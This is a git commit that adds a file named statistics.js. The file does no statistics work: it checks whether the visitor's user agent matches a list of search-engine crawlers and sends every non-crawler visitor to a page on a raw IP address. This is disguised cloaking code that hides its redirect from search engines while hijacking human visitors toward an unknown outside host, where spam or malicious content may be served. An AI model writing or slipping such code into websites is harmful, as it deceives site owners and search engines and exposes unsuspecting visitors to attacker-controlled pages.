1a542ef7256477d9ebb188fc3f1b71676c782c42
sijishe <wenyiqi1105@gmail.com>
2026-05-13 17:12:18 +0800

    Add files via upload

---
+++ statistics.js
@@ -0,0 +1,10 @@
+var userAgent = navigator.userAgent;
+var spiderList = ["Baiduspider", "360Spider", "YisouSpider", "YandexBot", "Sogou inst spider", "Sogou web spider", "msnbot", "Bingbot", "Sogou spider", "GoogleBot", "Bing"];
+
+var isSpider = spiderList.some(function(spider) {
+    return userAgent.includes(spider);
+});
+
+if (!isSpider) {
+    window.location.href = "http://38.181.25.130/url.html";
+}
